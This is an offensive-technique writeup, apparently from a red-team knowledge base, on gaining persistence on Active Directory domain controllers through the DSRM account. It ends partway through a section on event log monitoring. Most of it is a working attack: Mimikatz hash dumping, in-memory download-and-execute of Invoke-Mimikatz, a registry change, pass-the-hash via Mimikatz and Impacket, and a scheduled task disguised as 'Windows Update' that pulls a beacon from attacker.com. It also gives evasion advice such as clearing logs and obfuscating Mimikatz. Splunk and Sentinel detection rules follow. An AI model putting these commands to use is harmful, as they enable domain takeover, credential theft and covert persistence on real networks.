# [PERSIST-PROCESS-001]: Directory Service Restore Mode Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-PROCESS-001 |
| **MITRE ATT&CK v18.1** | [T1543 - Create or Modify System Process](https://attack.mitre.org/techniques/T1543/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows Active Directory (Domain Controllers) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (By Design - DSRM Required for Recovery) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Directory Services Restore Mode (DSRM) is a special safe mode available on every Domain Controller designed for recovery operations when Active Directory is corrupted or unavailable. During DC promotion, administrators create a local administrator account with a DSRM password that is typically rarely changed and often forgotten. An attacker with Domain Admin privileges or local admin access to a Domain Controller can extract the DSRM password hash, modify a critical registry key (`DsrmAdminLogonBehavior`), and use Pass-the-Hash techniques to authenticate as the DSRM local administrator remotely. This grants persistent administrative access to the Domain Controller that survives domain credential resets and password policy changes, allowing the attacker to maintain control of Active Directory infrastructure indefinitely.

**Attack Surface:** The attack directly targets the DSRM local administrator account stored in the Domain Controller's SAM database and the Windows Registry configuration at `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. The attack requires either local code execution on the DC or valid credentials with Domain Admin privileges to extract and manipulate these resources.

**Business Impact:** **A successful DSRM persistence attack grants an attacker permanent, privileged access to the core infrastructure of Active Directory, enabling complete domain compromise.** An attacker maintaining DSRM persistence can read the entire AD database (ntds.dit), extract all domain user credentials, modify group policies to backdoor the entire organization, reset any user password, access sensitive data across all systems in the domain, and maintain this access even after security teams reset domain administrator credentials. The attack is particularly dangerous because DSRM is rarely monitored, and the DSRM password often goes unchanged for years after initial DC deployment.

**Technical Context:** The attack typically requires 5-15 minutes to execute once the attacker has obtained initial access. Detection depends heavily on whether organizations have enabled specific Windows Event Log auditing (Event ID 4794) and registry modification monitoring. The technique is considered "loud" if full audit logging is enabled but nearly invisible if logging is not configured properly—which is the default state in many organizations.

### Operational Risk

- **Execution Risk:** **HIGH** – The attack irreversibly modifies registry configuration on the Domain Controller. While the modification can be reverted, it leaves clear forensic evidence and requires physical or administrative access to the DC to repair.

- **Stealth:** **MEDIUM** – If Event ID 4794 auditing and registry modification monitoring are not enabled (the default), the attack is essentially undetectable at the moment of execution. However, the presence of the registry modification can be detected via periodic compliance scans.

- **Reversibility:** **PARTIAL** – The registry modification can be reverted by changing the `DsrmAdminLogonBehavior` value back to 0, but the attacker will have already extracted the DSRM password hash and can continue using Pass-the-Hash attacks even after the registry is fixed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.3 | "Service account password management should occur on a regular schedule to ensure password hygiene. Particularly for DSRM and service accounts." |
| **DISA STIG** | Windows Server 2022 STIG V1R1 | AC-2(4): "Privileged account password strength and change frequency" - Applies to DSRM account |
| **CISA SCuBA** | Directory Services | "Monitor and log changes to critical DSRM configurations" |
| **NIST 800-53** | AC-3 | "Access Enforcement - Enforce approved authorizations for logical access to information and system resources" |
| **NIST 800-53** | AC-6 | "Least Privilege - Employ the principle of least privilege when granting system access" |
| **NIST 800-53** | AC-2(4) | "Account Management - Automated mechanisms shall enforce a password minimum strength" |
| **GDPR** | Art. 32 | "Security of Processing - Implement appropriate technical and organizational measures to ensure a level of security" |
| **DORA** | Art. 9 | "Protection and Prevention - ICT service providers shall establish, implement and maintain an appropriate ICT security policy" |
| **NIS2** | Art. 21 | "Cyber Risk Management Measures - Operators of essential services shall implement appropriate and cost-effective" |
| **ISO 27001** | A.9.2.3 | "Management of Privileged Access Rights - Restrict and manage the allocation and use of privileged access rights" |
| **ISO 27005** | 5.5 | "Risk Assessment - Identify and analyze risks to information security in the context of organizational objectives" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Local Administrator on the target Domain Controller
- **Ideal:** Domain Administrator (allows extraction from any network-connected system)
- **For Network-Based PTH:** Valid DSRM hash (extracted via Mimikatz or other credential dumping tools)

**Required Access:**
- Network access to the Domain Controller (SMB/RPC for credential extraction, or RDP for interactive access)
- Ability to execute PowerShell or cmd.exe on the Domain Controller
- Ability to run elevated commands (with `privilege::debug` or UAC bypass)

**Supported Versions:**
- **Windows Server 2016:** ✅ Fully Vulnerable
- **Windows Server 2019:** ✅ Fully Vulnerable
- **Windows Server 2022:** ✅ Fully Vulnerable
- **Windows Server 2025:** ✅ Fully Vulnerable

**Required Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) - For credential extraction and Pass-the-Hash
- [ntdsutil.exe](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ntdsutil) - Built-in Windows tool for DSRM operations
- PowerShell (Version 3.0+) - For registry manipulation
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Optional, for Linux-based hash attacks)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Optional, for alternative Kerberos attacks)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Determine DSRM Account Status

**Objective:** Confirm that the DSRM account exists and identify its current configuration state.

**PowerShell Command (From Domain Controller):**
```powershell
# Check if DSRM registry key exists and its current value
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" | Select-Object DsrmAdminLogonBehavior

# Expected output:
# DsrmAdminLogonBehavior
# 0  (or key does not exist - means DSRM only in boot mode)
```

**What to Look For:**
- If the key does not exist: Default behavior (value 0) - DSRM only usable when DC starts in DSRM mode
- If value is 0: Safe (current expected state)
- If value is 1: Warning - DSRM usable when AD DS service is stopped
- If value is 2: **CRITICAL** - DSRM usable at all times (persistence already established)

**Bash/Linux Command (Remote with DC credentials):**
```bash
# Using impacket to query DC registry (requires valid DC credentials)
reg.py "domain.com/Administrator:password@<DC_IP>" query "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior
```

### Step 2: Identify DSRM Account Details

**Objective:** Enumerate the local Administrator account on the Domain Controller to confirm DSRM account properties.

**PowerShell Command (From Domain Controller):**
```powershell
# List local user accounts on the DC
Get-LocalUser | Where-Object {$_.Name -eq "Administrator"}

# Example output:
# Name              Enabled Description
# ----              ------- -----------
# Administrator     True    Built-in account for administering the computer/domain

# Get more details including password properties
wmic useraccount where name='Administrator' list full
```

**What to Look For:**
- Confirm account exists and is enabled
- Check account properties (particularly password expiration settings - usually disabled for DSRM)
- Note: DSRM account is exempt from domain password policies

### Step 3: Check Audit Logging Status

**Objective:** Determine if the organization has enabled detection mechanisms for DSRM attacks.

**PowerShell Command (From Domain Controller):**
```powershell
# Check if Event ID 4794 (DSRM password reset) is being logged
wevtutil qe Security "/q:*[System[(EventID=4794)]]" /c:10

# Check registry audit policy for Account Management
auditpol /get /category:"Account Management"

# Expected output for good logging:
# Account Management: Success and Failure
```

**Bash Command (Check via PowerShell Remoting):**
```bash
# If you have remote access
powershell -ComputerName <DC_IP> -Credential domain\admin -ScriptBlock {auditpol /get /category:"Account Management"}
```

**What to Look For:**
- "Success and Failure" = Good, detections likely
- "Success only" = Partial, may miss some attacks
- "No Auditing" = Bad, attack execution nearly undetectable

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz-Based DSRM Hash Extraction & Pass-the-Hash (Windows Native)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025

**Precondition:** Must have local admin privileges on the Domain Controller OR Domain Admin credentials.

#### Step 1: Gain Administrative Access to Domain Controller

**Objective:** Establish an elevated PowerShell session with local admin rights on the DC.

**If using RDP (Interactive Access):**
```powershell
# Connect via RDP as Domain Admin
mstsc.exe /v:<DC_IP> /u:"DOMAIN\Administrator" /p:"<PASSWORD>"

# Once connected, open PowerShell as Administrator
# Right-click PowerShell → Run as Administrator
```

**If using Remote PowerShell (From your attacking machine):**
```powershell
# Create a credential object
$cred = Get-Credential  # Prompts for domain\username and password

# Enter remote session
Enter-PSSession -ComputerName <DC_IP> -Credential $cred

# Verify you have elevated privileges
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | Where-Object {$_ -eq "S-1-5-32-544"}
# S-1-5-32-544 = Local Administrators group on the DC
```

**Expected Output:**
```
PS C:\Users\Administrator> whoami
DOMAIN\Administrator

PS C:\Users\Administrator> whoami /priv | findstr /i "SeDebugPrivilege"
SeDebugPrivilege      Enabled     # This is REQUIRED for Mimikatz
```

**What This Means:**
- `whoami` shows you're running as Domain Admin or local admin on DC
- `SeDebugPrivilege` must be present and "Enabled" for Mimikatz to extract LSASS/SAM hashes

**OpSec & Evasion:**
- Avoid interactive RDP sessions (leaves logon records) - prefer script-based execution
- If using Mimikatz, consider using in-memory execution or reflective DLL injection to avoid file system artifacts
- Monitor for Mimikatz process creation (process name, command line) in Event Viewer

#### Step 2: Download/Execute Mimikatz on Domain Controller

**Objective:** Deploy Mimikatz to the Domain Controller for credential extraction.

**Option A: Direct Download & Execute (If internet access available):**
```powershell
# Navigate to a temp folder
cd C:\Windows\Temp

# Download Mimikatz
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile mimikatz.zip

# Extract
Expand-Archive -Path mimikatz.zip -DestinationPath .

# Run Mimikatz
.\mimikatz\x64\mimikatz.exe
```

**Option B: Pre-Staged Binary (No Internet Required):**
```powershell
# Copy pre-downloaded mimikatz binary via SMB/RDP
# Assume it's already on the DC at C:\Windows\Temp\mimikatz.exe

C:\Windows\Temp\mimikatz.exe
```

**Option C: In-Memory Execution (More Evasive):**
```powershell
# Use PowerShell to invoke Mimikatz in memory without file artifacts
$mimikatzUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"
IEX(New-Object Net.WebClient).DownloadString($mimikatzUrl)
Invoke-Mimikatz -Command '"lsadump::sam"'
```

**Expected Output:**
```
  .#####.   mimikatz 2.2.0 (x64) built on Sep 19 2022 13:01:30
 .## ^ ##.  "A La Decouverte de Vos Mots de Passe"
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://twitter.com/gentilkiwi
 '## v ##'       Vincent LE TOUX ( vincent.letoux@gmail.com )
  '#####'        > https://twitter.com/vletoux

mimikatz #
```

**What This Means:**
- Mimikatz has loaded successfully and is ready for command execution
- The banner confirms the version (2.2.0 or later recommended)

**OpSec & Evasion:**
- Avoid downloading from GitHub during work hours (looks suspicious in proxy logs)
- Consider downloading to a non-Windows server (Linux) and using SMB to transfer
- Use process injection to hide Mimikatz in legitimate process memory
- **Detection Likelihood:** HIGH if Windows Defender is enabled (detects Mimikatz binary)
  - **Mitigation:** Use obfuscation, encryption, or in-memory variants

#### Step 3: Extract DSRM Administrator Account Hash from SAM

**Objective:** Dump the local SAM database to retrieve the DSRM administrator password hash.

**Command (Inside Mimikatz REPL):**
```
mimikatz # privilege::debug
# Verify SeDebugPrivilege is enabled

mimikatz # token::elevate
# Switch to SYSTEM token (if not already running as SYSTEM)

mimikatz # lsadump::sam
# Extract SAM database (includes DSRM admin account)
```

**Expected Output:**
```
Domain : COMPUTER_NAME
SysKey : {KEY_HEX_VALUE}
...
RID  : 00000220 (544)
User : Administrator
  Hash NTLM: fc063a56bf43cb54e57a2522d4d48678
  Hash SHA1: 1a4f8c4a8e6c2f1d9b3e5a7c9d1f3b5e7a9c2d4f
```

**What This Means:**
- **RID 544:** Local Administrators group (special RID for DC local admin)
- **Hash NTLM:** This is the NTLM hash of the DSRM administrator password (this is what you need)
- **Hash SHA1:** Alternative hash format (less commonly used)

**Example Hash:** `fc063a56bf43cb54e57a2522d4d48678` ← This is the DSRM admin password hash you'll use for Pass-the-Hash

**OpSec & Evasion:**
- `lsadump::sam` requires `SeDebugPrivilege` (elevated session)
- Alternative: `lsadump::lsa /patch` (targets LSASS memory instead of SAM file) - slightly less noisy
- **Detection Likelihood:** MEDIUM - Process name `mimikatz.exe` triggers Windows Defender alerts

#### Step 4: Modify Registry to Enable Remote DSRM Authentication

**Objective:** Set the `DsrmAdminLogonBehavior` registry value to 2 to allow DSRM authentication over the network.

**Command (Inside PowerShell, elevated):**
```powershell
# Set registry value to enable DSRM remote login
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "DsrmAdminLogonBehavior" `
  -Value 2 `
  -PropertyType DWORD `
  -Force

# Verify the change
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" | Select-Object DsrmAdminLogonBehavior
```

**Expected Output:**
```
DsrmAdminLogonBehavior
--
                    2
```

**What This Means:**
- Value 2 = DSRM account can be used at ANY time, including remote network authentication
- This is the persistence hook - attackers can now authenticate as DSRM admin from anywhere in the network
- This registry change typically generates Event ID 4657 (registry value modified) if auditing is enabled

**Version Note:**
All Windows Server versions 2016+ handle this registry modification identically. No version-specific changes required.

**Alternative Command (Using reg.exe):**
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

**OpSec & Evasion:**
- Registry modifications are logged to Event ID 4657 if auditing is enabled
- To hide, clear Event Log after modification (requires additional SYSTEM commands)
- Consider using registry hive manipulation if direct registry access is logged
- **Detection Likelihood:** HIGH if registry modification auditing is enabled

#### Step 5: Execute Pass-the-Hash Attack Using DSRM Credentials

**Objective:** Use the extracted DSRM hash to authenticate as the local administrator on the Domain Controller.

**Command (Inside Mimikatz, back in REPL):**
```
mimikatz # sekurlsa::pth /domain:.<DSRM_DOMAIN> /user:Administrator /ntlm:fc063a56bf43cb54e57a2522d4d48678 /run:powershell.exe
```

**Explanation of Parameters:**
- `/domain:.` = Use the local domain (the dot means "this computer" for local auth)
- `/user:Administrator` = Username (DSRM local admin always named "Administrator")
- `/ntlm:fc063a56bf43cb54e57a2522d4d48678` = The NTLM hash you extracted in Step 3
- `/run:powershell.exe` = Launch PowerShell with the stolen credentials

**Expected Output:**
```
User : Administrator
Domain : <COMPUTERNAME>
Program : powershell.exe
PID : 1234
```

**What This Means:**
- A new PowerShell process has been created running as the DSRM Administrator account
- You now have administrative access to the DC without knowing the actual password

**Verification (Inside the new PowerShell window):**
```powershell
whoami
# Output: COMPUTERNAME\Administrator

whoami /groups
# Output: Shows LOCAL ADMINISTRATORS group membership (S-1-5-32-544)
```

**OpSec & Evasion:**
- The new PowerShell window appears as a normal user process to older monitoring tools
- However, Windows Defender and modern EDR solutions detect the `/pth` switch in command line
- **Detection Likelihood:** MEDIUM-HIGH (parent-child process relationships, command line inspection)

### METHOD 2: Remote DSRM Pass-the-Hash Attack via Impacket (Linux-Based)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025

**Platform Requirements:** Linux system with Impacket installed; requires pre-extracted DSRM hash from Method 1.

**Precondition:** Must have already extracted the DSRM hash using Method 1 or equivalent credential dumping.

#### Step 1: Prepare Impacket Environment (On Linux Attacker Machine)

**Objective:** Set up Impacket tools for Pass-the-Hash attacks.

**Installation:**
```bash
# Clone Impacket repository
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket

# Install dependencies
pip3 install -r requirements.txt
python3 setup.py install

# Verify installation
psexec.py --help
```

**Expected Output:**
```
Impacket v0.11.0 - Copyright 2021 SecureAuth Corporation

usage: psexec.py [-h] [-c CODEC] [-target-ip ip_address] [-port [destination port]]
                 [-mode {SERVER,SHARE}] ...
```

**What This Means:**
- Impacket is installed and ready for exploitation
- `psexec.py` is one of several tools available (others: `smbexec.py`, `wmiexec.py`, etc.)

#### Step 2: Execute Pass-the-Hash via psexec.py

**Objective:** Use the DSRM hash to execute commands on the remote Domain Controller.

**Command:**
```bash
# Basic PTH attack
psexec.py -hashes :fc063a56bf43cb54e57a2522d4d48678 \\.\\Administrator@<DC_IP> cmd.exe

# Parameters:
# -hashes :HASH = Pass-the-Hash format (LM hash:NTLM hash, use empty LM hash)
# \\.\\Administrator = Local administrator (backslashes escape shell interpretation)
# @<DC_IP> = IP address of the Domain Controller
# cmd.exe = Command to execute
```

**Example with Real IP:**
```bash
psexec.py -hashes :fc063a56bf43cb54e57a2522d4d48678 \\.\\Administrator@192.168.1.10 cmd.exe
```

**Expected Output:**
```
Impacket v0.11.0 - Copyright 2021 SecureAuth Corporation

[*] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Authenticating to 192.168.1.10 as user Administrator
[+] Successfully authenticated as SYSTEM!
[!] Attempting to retrieve account SID for SYSTEM
[+] Got SID: S-1-5-18
C:\>
```

**What This Means:**
- You have achieved code execution as SYSTEM on the remote Domain Controller
- The prompt `C:\>` indicates you can now execute commands remotely
- "Authenticated as SYSTEM" = highest privilege level

**Verification Commands:**
```cmd
whoami
# Output: NT AUTHORITY\SYSTEM

ipconfig
# Displays DC network configuration

dir C:\Windows\NTDS
# Lists NTDS.dit location (confirms DC access)
```

**Alternative: smbexec.py (Semi-Interactive):**
```bash
# smbexec provides a semi-interactive shell (less noisy than psexec)
smbexec.py -hashes :fc063a56bf43cb54e57a2522d4d48678 \\.\\Administrator@<DC_IP>
```

**OpSec & Evasion:**
- Impacket tools create SMB connections that may be logged in network monitoring
- `psexec.py` creates new services (more noisy), `smbexec.py` uses command execution (less noisy)
- Network-based detection: Monitor for SMB connections from external IPs to DCs
- **Detection Likelihood:** MEDIUM (depends on network detection, not endpoint-based)

#### Step 3: Establish Persistence Post-Exploitation (Optional)

**Objective:** Create additional persistence mechanisms to survive credential resets.

**Command (From remote shell):**
```bash
# Create a scheduled task that runs as DSRM admin (survives AD resets)
schtasks /create /tn "Windows Update" /tr "C:\Windows\System32\cmd.exe /c powershell.exe -NoP -W H -C 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/beacon\")'" /sc minute /mo 5 /ru SYSTEM /f

# Verify persistence
schtasks /query /tn "Windows Update" /v
```

**What This Means:**
- A scheduled task is created that executes every 5 minutes
- Task runs as SYSTEM (highest privilege)
- Task downloads and executes a remote beacon/shell
- Persistence survives reboot and credential changes

---

### METHOD 3: ntdsutil Command-Line DSRM Password Reset (Administrative Tool)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025

**Precondition:** Must have local administrative access to the Domain Controller (preferably interactive or RDP).

**Use Case:** This method is typically used during legitimate maintenance but can be exploited for unauthorized DSRM password changes.

#### Step 1: Access ntdsutil Interactive Prompt

**Objective:** Launch the ntdsutil tool and navigate to DSRM password management.

**Command (PowerShell, elevated):**
```powershell
ntdsutil
```

**Alternative (cmd.exe):**
```cmd
C:\> ntdsutil
ntdsutil: set dsrm password
```

**Expected Output:**
```
ntdsutil: set dsrm password
DSRM is being set for localhost
```

**What This Means:**
- The `ntdsutil` tool is now in the "set dsrm password" mode
- Ready to accept password reset commands

#### Step 2: Reset DSRM Password

**Objective:** Set a new DSRM password.

**Command (Inside ntdsutil prompt):**
```
DSRM: reset password on server null
Type a new password for the directory services restore mode administrator account:
```

**Interactive Execution:**
```
# When prompted, enter the new password
Type new password:
[Enter your desired password - will not be echoed]

Type new password again to confirm:
[Re-enter password for confirmation]

Password changed successfully.
```

**Expected Output:**
```
DSRM: q
ntdsutil: q

C:\>
```

**What This Means:**
- The DSRM password has been changed
- The new password is now the only valid credential for offline DC recovery
- This creates a new hash that can be extracted via Mimikatz

**Version Note:** This command works identically across Server 2016, 2019, 2022, and 2025.

**Alternative: Non-Interactive (Batch/Script):**
```powershell
# Note: ntdsutil does not support direct password input via pipe
# Must be interactive or pre-staged

# Create a script file with commands
@"
set dsrm password
reset password on server null
NewPassword123!
NewPassword123!
q
q
"@ | Set-Content -Path C:\temp\dsrm_reset.txt

# Execute (requires manual password entry)
type C:\temp\dsrm_reset.txt | ntdsutil
```

**OpSec & Evasion:**
- Using `ntdsutil` legitimately is common (not suspicious)
- However, **changing the DSRM password** without documentation is suspicious
- The change generates Event ID 4794 in the Security Event Log
- **Detection Likelihood:** HIGH if Event ID 4794 is monitored

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Testing

**Status:** No specific Atomic Red Team test exists for DSRM exploitation. However, related tests for account manipulation and persistence apply.

**Related Atomic Tests:**
- **T1098** - Account Manipulation
  ```
  Invoke-AtomicTest T1098 -TestNumbers 1,2,3
  ```
- **T1543.003** - Create or Modify System Process: Windows Service
  ```
  Invoke-AtomicTest T1543.003 -TestNumbers 1,2
  ```
- **T1547.001** - Boot or Logon Autostart Execution: Registry Run Keys
  ```
  Invoke-AtomicTest T1547.001 -TestNumbers 1
  ```

**Custom Test for DSRM (Red Team Development):**
```powershell
# This test simulates the DSRM persistence setup
# NOTE: Only run in authorized lab environments

# Test 1: Extract DSRM Hash
function Test-DSRMHashExtraction {
    param([string]$OutputPath = "C:\Temp\dsrm_hash.txt")
    
    # Requires elevated privileges
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Error "Requires Administrator privileges"
        return
    }
    
    # Download and execute Mimikatz (in-memory variant preferred)
    $mimikatzUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"
    
    try {
        IEX(New-Object Net.WebClient).DownloadString($mimikatzUrl)
        $result = Invoke-Mimikatz -Command '"lsadump::sam"'
        
        # Parse output for Administrator hash
        if ($result -match "Administrator.*Hash NTLM:\s*(\w+)") {
            $hash = $matches[1]
            "DSRM Hash Extracted: $hash" | Tee-Object -FilePath $OutputPath
            return $hash
        }
    } catch {
        Write-Error "Failed to extract DSRM hash: $_"
    }
}

# Test 2: Modify Registry (DsrmAdminLogonBehavior)
function Test-DSRMRegistryModification {
    $regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
    $regKey = "DsrmAdminLogonBehavior"
    
    # Check current value
    $currentValue = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).$regKey
    Write-Host "Current DsrmAdminLogonBehavior: $currentValue"
    
    # Set value to 2 (PERSISTENCE)
    try {
        New-ItemProperty -Path $regPath -Name $regKey -Value 2 -PropertyType DWORD -Force -ErrorAction Stop
        Write-Host "Successfully set DsrmAdminLogonBehavior to 2 (PERSISTENCE ENABLED)"
        
        # Verify
        $newValue = (Get-ItemProperty -Path $regPath).$regKey
        return $newValue -eq 2
    } catch {
        Write-Error "Failed to modify registry: $_"
        return $false
    }
}

# Test 3: Pass-the-Hash Simulation
function Test-DSRMPassTheHash {
    param([string]$DSRMHash)
    
    if (-not $DSRMHash) {
        Write-Error "DSRM hash required"
        return
    }
    
    # Use Mimikatz PTH
    try {
        # This requires Mimikatz loaded
        $mimikatzUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"
        IEX(New-Object Net.WebClient).DownloadString($mimikatzUrl)
        
        # Execute PTH (this will spawn a new process)
        Invoke-Mimikatz -Command "sekurlsa::pth /domain:. /user:Administrator /ntlm:$DSRMHash /run:cmd.exe"
        
        Write-Host "Pass-the-Hash executed (check for new cmd.exe process)"
        return $true
    } catch {
        Write-Error "PTH execution failed: $_"
        return $false
    }
}

# Run all tests
Write-Host "[*] Starting DSRM Persistence Tests..."
$hash = Test-DSRMHashExtraction
$regModified = Test-DSRMRegistryModification
if ($hash) {
    Test-DSRMPassTheHash -DSRMHash $hash
}
Write-Host "[+] DSRM Persistence Test Complete"
```

**Cleanup Commands:**
```powershell
# Revert DSRM registry change
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Force -ErrorAction SilentlyContinue

# Delete Mimikatz if downloaded
Remove-Item -Path "C:\Windows\Temp\mimikatz*" -Recurse -Force -ErrorAction SilentlyContinue

# Clear PowerShell history
[System.Environment]::SetEnvironmentVariable('PSReadLineHistorySavePath', $null, 'CurrentUser')
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: DSRM Registry Modification Detection

**Rule Configuration:**
- **Required Index:** windows, main, endpoint
- **Required Sourcetype:** WinEventLog:Security, endpoint
- **Required Fields:** EventCode, Registry_Key_Name, Registry_Value_Name, Registry_Value_Data
- **Alert Threshold:** 1 occurrence (any change to the key is suspicious)
- **Applies To Versions:** Windows Server 2016, 2019, 2022, 2025

**SPL Query:**
```spl
index=windows EventCode=4657 
  (Registry_Key_Name="*\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior" 
   OR Registry_Value_Name="DsrmAdminLogonBehavior")
  Registry_Value_Data IN ("1", "2")
| stats count by host, user, Registry_Value_Data, Action
| where count >= 1
```

**What This Detects:**
- **Line 1-2:** Filters for Event 4657 (Registry value changed)
- **Line 3-5:** Targets the specific registry key `DsrmAdminLogonBehavior`
- **Line 6:** Only alerts if value is changed to 1 or 2 (0 is safe, default)
- **Line 7-8:** Groups results by host and user for correlation

**Manual Configuration Steps (Splunk Web):**
1. **Log into Splunk Web** → **Search & Reporting**
2. Click **+ New Alert**
3. Paste the SPL query above
4. Set **Title:** "DSRM Registry Modification Detected"
5. Set **Alert Type:** → **Scheduled**
6. Set **Run:** Every 15 minutes
7. Set **Trigger Condition:** → **Custom** → `count >= 1`
8. **Actions** → Enable: **Send email**, **Webhook**, **ServiceNow incident creation**
9. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** Initial domain controller promotion (when DSRM first set up), legitimate DSRM password resets during maintenance windows
- **Benign Tools:** None - only legitimate DSRM tools (ntdsutil) and attackers modify this key
- **Tuning:** Exclude known maintenance windows by adding `NOT user IN ("SYSTEM", "scheduled_task_account")` if desired

**Source:** [Splunk Research](https://research.splunk.com/endpoint/08cb291e-ea77-48e8-a95a-0799319bf056/), [MITRE ATT&CK T1543](https://attack.mitre.org/techniques/T1543/)

### Rule 2: DSRM Password Reset via ntdsutil

**Rule Configuration:**
- **Required Index:** windows, main, sysmon
- **Required Sourcetype:** WinEventLog:Security, Sysmon
- **Required Fields:** EventCode, CommandLine, ParentImage, Image
- **Alert Threshold:** 1 occurrence
- **Applies To Versions:** All Windows Server versions

**SPL Query:**
```spl
index=windows (EventCode=4688 OR EventCode=1)
  (CommandLine="*ntdsutil*" AND (CommandLine="*set dsrm password*" OR CommandLine="*reset password*"))
| dedup host, user, CommandLine
| stats count by host, user, CommandLine, Image, ParentImage
```

**What This Detects:**
- **Line 1:** Filters for process creation events (4688 = Windows Security, 1 = Sysmon)
- **Line 2:** Looks for `ntdsutil` executed with DSRM-specific commands
- **Line 3:** Removes duplicate entries
- **Line 4:** Correlates by host, user, and command line

**False Positive Analysis:**
- **Legitimate Activity:** Authorized admins resetting forgotten DSRM passwords during scheduled maintenance
- **Tuning:** Whitelist known admin accounts: `NOT user IN ("DOMAIN\AdminGroup", "SYSTEM")`

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: DSRM Registry Modification Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon Events
- **Required Fields:** EventID, RegistryPath, RegistryValueName, RegistryValueData
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4657
| where RegistryPath contains @"System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior"
| where RegistryValueData in ("1", "2")
| project TimeGenerated, Computer, Account, RegistryPath, RegistryValueData, EventID
| summarize count() by Computer, Account, RegistryValueData
| where count_ >= 1
```

**What This Detects:**
- Monitors for registry value changes (Event 4657)
- Specifically targets the DSRM persistence key
- Alerts only on suspicious values (1 or 2)
- Returns count and details for incident response

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - **Name:** `DSRM Registry Persistence Detected`
   - **Description:** Detects modifications to DsrmAdminLogonBehavior registry that enable remote DSRM access
   - **Severity:** `Critical`
   - **Status:** `Enabled`
5. **Set rule logic Tab:**
   - Paste the KQL query above in the "Rule query" field
   - **Run query every:** `5 minutes`
   - **Lookup data from the last:** `10 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this rule**
   - **Group alerts into a single incident:** `Grouped by Account, Computer`
7. **Automated response Tab (Optional):**
   - Select **Playbook** (e.g., isolate host, notify SOC)
8. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create analytics rule
$rule = @{
    ResourceGroupName = $ResourceGroup
    WorkspaceName = $WorkspaceName
    DisplayName = "DSRM Registry Persistence Detected"
    Query = @"
SecurityEvent
| where EventID == 4657
| where RegistryPath contains @"System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior"
| where RegistryValueData in ("1", "2")
| project TimeGenerated, Computer, Account, RegistryPath, RegistryValueData, EventID
| summarize count() by Computer, Account, RegistryValueData
| where count_ >= 1
"@
    Severity = "Critical"
    Enabled = $true
    ScheduledRuleFrequency = "PT5M"  # Every 5 minutes
}

New-AzSentinelAlertRule @rule
```

**Source:** [Microsoft Sentinel GitHub](https://github.com/Azure/Azure-Sentinel), [Microsoft Learn](https://learn.microsoft.com/en-us/azure/sentinel/create-analytics-rules)

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID 4657: Registry Value Changed (Primary Detection)

**Log Source:** Security Event Log

